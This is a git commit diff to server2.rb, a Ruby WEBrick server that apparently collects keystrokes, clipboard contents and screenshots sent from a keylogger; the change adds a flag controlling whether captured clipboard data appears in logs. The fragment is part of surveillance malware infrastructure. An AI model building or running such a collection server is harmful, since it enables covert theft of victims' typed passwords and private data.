8ea6c48745737a2af304e0690d622dbad251890d
DarkSeraph <114529635+Kuraiyume@users.noreply.github.com>
2024-09-05 22:45:16 +0800

    Update server2.rb

--- server2.rb
+++ server2.rb
@@ -20,13 +20,14 @@ require 'base64'
 
 class MyServlet < WEBrick::HTTPServlet::AbstractServlet
   # Initialize the servlet with a logger and file paths
-  def initialize(server, keystrokes_file_path, clipboard_file_path, screenshots_dir)
+  def initialize(server, keystrokes_file_path, clipboard_file_path, screenshots_dir, show_clipboard_in_logs)
     super(server)
     @logger = Logger.new(STDOUT) # Log to standard output
     @logger.level = Logger::INFO # Set logging level to INFO
     @keystrokes_file_path = keystrokes_file_path # Path to the file where keystrokes will be saved
     @clipboard_file_path = clipboard_file_path # Path to the file where clipboard data will be saved
     @screenshots_dir = screenshots_dir # Directory to save screenshots
+    @show_clipboard_in_logs = show_clipboard_in_logs # Flag to determine if clipboard data should be shown in logs
   end
 
   # Handle POST requests
@@ -103,11 +104,11 @@ logger.level = Logger::INFO
 
 # If the user didn't allow it, the captured clipboard will still be saved to saved_captures.txt by default
 print "Do you want to display the captured clipboard data in the logs? (y/N): " 
-show_clipboard_in_logs = gets.chomp.downcase == 'yes'
+show_clipboard_in_logs = gets.chomp.downcase == 'y'
 
 # Create and start the WEBrick server
 server = WEBrick::HTTPServer.new :Port => port, :Logger => logger, :AccessLog => []
-server.mount '/', MyServlet, keystrokes_file_path, clipboard_file_path, screenshots_dir # Mount the custom servlet
+server.mount '/', MyServlet, keystrokes_file_path, clipboard_file_path, screenshots_dir, show_clipboard_in_logs # Mount the custom servlet
 
 trap 'INT' do
   logger.info("Shutting down server...") # Log shutdown 
